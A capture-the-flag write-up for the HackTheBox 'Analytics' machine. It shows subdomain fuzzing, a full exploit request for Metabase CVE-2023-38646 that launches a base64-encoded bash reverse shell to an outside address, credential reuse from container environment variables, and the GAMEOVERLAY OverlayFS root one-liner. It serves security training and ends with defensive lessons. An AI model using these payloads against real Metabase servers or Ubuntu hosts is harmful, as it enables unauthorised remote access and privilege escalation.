---
title: "Analytics"
date: 2023-11-25
type: docs
tags:
  - htb
  - linux
  - easy
  - metabase
  - cve-2023-38646
  - rce
  - vhost-fuzzing
  - h2-database
  - jdbc
  - container
  - gameoverlay
  - cve-2023-2640
  - cve-2023-32629
  - overlayfs
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04), **Difficulty:** Easy, **Released:** 2023-11-25, **IP:** `10.10.11.233` → `analytical.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Web root redirects to `analytical.htb`; vhost fuzzing finds `data.analytical.htb`.
2. `data.` runs **Metabase**, vulnerable to **CVE-2023-38646**. A pre-auth `setup-token` leak at `/api/session/properties` that leads to RCE through a malicious **H2 JDBC** connection string.
3. Send `POST /api/setup/validate` with an H2 `CREATE TRIGGER` that runs a base64 bash reverse shell → shell inside the Metabase **container**.
4. Container env vars (`env` / `/proc/1/environ`) leak **`metalytics : An4lytics_ds20223#`** → SSH to the host.
5. Kernel is Ubuntu with vulnerable OverlayFS (**GAMEOVERLAY**, CVE-2023-2640 / CVE-2023-32629) → one-liner → root.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| Metabase container env | `metalytics : An4lytics_ds20223#` |
| `user.txt` | `/home/metalytics/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Analytics is a two-move box: one CVE for the foothold, one kernel CVE for root, with a container in between whose environment variables hand you the SSH credentials. It's a good example of **enumerate the vhost before anything else** (the site is useless until you find `data.`), and of how modern "N-day" boxes work. Identify the product and version, match a public CVE, run a known payload. The part worth actually understanding to actually understand is *why* the Metabase bug is RCE: it's a **JDBC connection string injection** into an embedded **H2** database, and H2 lets you define SQL triggers that execute Java.

Related N-day web boxes: [Monitored](/writeups/hackthebox/linux/medium/monitored/) (Cacti CVE), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/) (Cacti + Docker), [Cactus](/writeups/tryhackme/linux/easy/cactus/) (Cacti). Related kernel-CVE-to-root: [Bizness](/writeups/hackthebox/linux/easy/bizness/) doesn't, but [GameBuzz](/writeups/tryhackme/linux/hard/gamebuzz/) / [Uranium CTF](/writeups/tryhackme/linux/hard/uranium-ctf/) / [Theseus](/writeups/tryhackme/linux/insane/theseus/) use PwnKit; the OverlayFS bug here is the same "distro kernel is behind" idea.

---

## Full Walkthrough

When accessing the webserver we get a different domain.

![Pasted image 20240203010958](Pasted-image-20240203010958.png)

Using Ffuf we were able to uncover a subdomain.

```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c \
  -u http://analytical.htb/ -H "Host: FUZZ.analytical.htb" --mc all --fw 4
```

```console
data                    [Status: 200, Size: 77702, Words: 3574, Lines: 28]
```

<div class="callout callout-note">

**Why `--fw 4` / `--mc all`**

The server answers *every* Host header with the same default page. Filtering by status is useless (everything is 200); instead you filter out the **word count** of that boilerplate response (`4`) and only surface hosts that return something different. `data.` returns a full Metabase app. 3574 words. So it survives the filter. This "filter the baseline, keep the outliers" technique is the core of vhost/param fuzzing. Same idea used on [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Heal](/writeups/hackthebox/linux/medium/heal/), [Environment](/writeups/hackthebox/linux/medium/environment/).

</div>

After visiting this url we see that it is running a Metabase instance. We use nuclei to help with enumeration and possible vulnerability assessment.

```bash
nuclei -t ~/nuclei-templates/http/cves -u http://data.analytical.htb/ -rl 40
```

```console
[CVE-2023-38646] [http] [critical] http://data.analytical.htb/api/setup/validate
```

After validating this was not a false positive we visit `http://data.analytical.htb/api/session/properties` and confirm it. The response contains the pre-auth `setup-token`.

![Pasted image 20240203015502](Pasted-image-20240203015502.png)

<div class="callout callout-note">

**CVE-2023-38646, Metabase pre-auth RCE**

Metabase < 0.46.6.1 exposes the first-run **`setup-token`** at the unauthenticated endpoint `GET /api/session/properties`. That token is meant to be valid only until an admin account exists, but the check is missing, so it still works on a fully configured instance. `POST /api/setup/validate` then lets you *test* a database connection using that token, and Metabase bundles the **H2** engine, whose JDBC URL accepts INIT and trigger definitions. Supplying a `db` string containing `CREATE TRIGGER ... AS $$ ... java.lang.Runtime.getRuntime().exec(...) $$` runs arbitrary Java when the connection is validated. No auth, no user interaction. Patched by removing the token exposure and blocking H2 for user-supplied connections.

</div>

Now we are going to use Burp to capture the request from the page, then change it to get command execution. Within the initial request the `setup-token` is leaked; drop it into the validate payload:

```http
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
Content-Type: application/json
Content-Length: 822

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjIzOC85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

The base64 blob decodes to `bash -i >& /dev/tcp/10.10.14.238/9001 0>&1`. Start `nc -lvnp 9001`, send the request, and catch the shell.

<div class="callout callout-note">

**Beyond the recorded notes, Container → host → root**

The operator's notes stop at the payload. The rest of the box:

**1. You land as `metabase` inside a Docker container.** `hostname` is a short hash, `/` has an `.dockerenv`, and there's no `metalytics` home dir. Metabase reads its SSH-reusable creds from the environment:
```bash
env | grep -i meta
# META_USER=metalytics
# META_PASS=An4lytics_ds20223#
```
(`/proc/1/environ` works too.)

**2. SSH to the real host:**
```bash
ssh metalytics@analytical.htb      # An4lytics_ds20223#
cat user.txt
```

**3. GAMEOVERLAY (CVE-2023-2640 + CVE-2023-32629).** `uname -r` shows a `6.2.0` Ubuntu kernel vulnerable to an OverlayFS flaw where file capabilities set in an unprivileged user namespace are honoured on the upper layer. Public one-liner:
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cat /root/root.txt; bash")'
```
Gives `uid=0`.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/metalytics/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons & Takeaways

- **Always fuzz vhosts / subdomains first** when the root domain is a redirect or a placeholder. The real app is often on `data.`, `dev.`, `admin.`.
- **N-day workflow:** fingerprint product → exact version → search CVE / nuclei → confirm with a benign probe (here `/api/session/properties`) before firing the payload.
- **Secrets in environment variables** are readable by any process in the container and survive to `/proc/<pid>/environ`. Use a secrets manager or mounted files with tight perms, not `-e PASS=`.
- **Keep the host kernel patched.** A current distro kernel is still months behind; OverlayFS/`nsenter`/`user_namespaces` bugs appear regularly.
- **Don't bundle H2** (or any embeddable SQL engine that can execute code) as a user-selectable connection type.

---

## Related Writeups

- **N-day web product + version → public exploit:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Cactus](/writeups/tryhackme/linux/easy/cactus/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **Container escape via leaked creds / env:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Jupiter](/writeups/hackthebox/linux/medium/jupiter/)
- **Kernel / local-privesc CVE to root:** [GameBuzz](/writeups/tryhackme/linux/hard/gamebuzz/), [Uranium CTF](/writeups/tryhackme/linux/hard/uranium-ctf/), [Theseus](/writeups/tryhackme/linux/insane/theseus/)
- **vhost / Host-header fuzzing:** [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Environment](/writeups/hackthebox/linux/medium/environment/), [Heal](/writeups/hackthebox/linux/medium/heal/)

## References

- CVE-2023-38646 (Metabase) <https://nvd.nist.gov/vuln/detail/CVE-2023-38646>
- Metabase advisory GHSA-w73p- mp8v-2xxv <https://github.com/metabase/metabase/security/advisories>
- GAMEOVERLAY (CVE-2023-2640 / CVE-2023-32629) <https://ubuntu.com/security/CVE-2023-2640>
- H2 database `CREATE TRIGGER` <https://www.h2database.com/html/commands.html#create_trigger>
